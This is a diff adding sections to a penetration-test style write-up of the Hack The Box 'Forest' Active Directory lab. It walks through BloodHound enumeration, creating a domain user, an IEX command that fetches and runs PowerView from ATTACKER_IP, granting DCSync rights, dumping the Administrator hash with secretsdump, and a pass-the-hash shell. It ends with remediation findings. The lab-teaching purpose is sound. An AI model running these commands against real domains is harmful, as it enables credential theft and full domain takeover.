@@ -165,17 +165,153 @@ Successful low-level shell obtained.
 
 ## 7. Post-Exploitation
 
+Manual enumeration revealed:
+
+```
+whoami /groups
+```
+
+Notable group membership:
+
+- Account Operators
+- Service Accounts
+- Privileged IT Accounts
+
+Domain group enumeration:
+
+```
+net group /domain
+```
+
+Exchange Windows Permissions group identified as interesting.
+
+Bloodhound Collection:
+
+```
+bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -dc FOREST.htb.local -ns 10.129.241.116 -c All --zip
+```
+
+Revealed the shortest path to Domain Admin:
+
+```
+svc-alfresco
+→ Service Accounts
+→ Privileged IT Accounts
+→ Account Operators
+→ GenericAll over Exchange Windows Permissions
+→ WriteDACL over htb.local domain
+→ DCSync capability
+→ Domain Admin compromise
+```
+
 ---
 
 ## 8. Privilege Escalation
+
+Created user `johnwick` and added to Exchange Windows Permissions:
+
+```
+net user johnwick P@ssword1 /add /domain
+
+net group "Exchange Windows Permissions" /add johnwick
+```
+
+Uploaded PowerView:
+
+```
+IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/PowerView.ps1')
+```
+
+Granted DCSync rights:
+
+```
+$pass = ConvertTo-SecureString 'P@ssword1' -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential('HTB\johnwick', $pass)
+
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity johnwick -Rights DCSync
+```
+
+Administrator NTLM hash extracted:
+
+```
+secretsdump.py htb.local/johnwick:P@ssword1@10.129.241.116
+```
+
+Validated via CrackMapExec (Pwn3d!):
+
+```
+crackmapexec smb 10.129.241.116 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+```
+
+Admin shell via Pass-the-Hash:
+
+```
+psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.241.116
+```
+
+SYSTEM shell obtained.
 
 ---
 
 ## 9. Proof of Compromise
 
+**User Flag**: *REDACTED*
+
+```
+type C:\Users\svc-alfresco\Desktop\user.txt
+```
+
+**Root Flag**: *REDACTED*
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+This confirms full domain compromise.
+
 ---
 
 ## 10. Findings & Recommendations
+
+### **Finding:** AS-REP Roastable Service Account
+
+**Severity:** Critical
+
+**Description:**
+A service account was configured without Kerberos preauthentication enabled, making it vulnerable to AS-REP roasting attacks.
+
+**Impact:**
+Attackers could request authentication material and perform offline password cracking without valid domain credentials, potentially leading to privilege escalation.
+
+**Recommendation:**
+Enforce Kerberos preauthentication for all accounts, audit for accounts with the UF_DONT_REQUIRE_PREAUTH flag set, and ensure strong, complex passwords are used for service accounts.
+
+### **Finding:** Excessive Privileges via Exchange Windows Permissions
+
+**Severity:** Critical
+
+**Description:**
+Members of the Exchange Windows Permissions group had excessive permissions on the domain object, including the ability to modify ACLs.
+
+**Impact:**
+Attackers could grant themselves DCSync rights and extract domain credentials, leading to full domain compromise.
+
+**Recommendation:**
+Remove unnecessary WriteDACL permissions on the domain object, audit Exchange-related security groups, and apply the principle of least privilege to delegated administrative roles.
+
+### **Finding:** Over-Permissive Account Operators Membership
+
+**Severity:** High
+
+**Description:**
+The Account Operators group contained users with excessive privileges, allowing modification of privileged domain groups.
+
+**Impact:**
+Attackers could manipulate group memberships and escalate privileges within the domain.
+
+**Recommendation:**
+Remove unnecessary users from the Account Operators group, carefully restrict delegated administration, and regularly audit privileged group memberships.
 
 ---
 
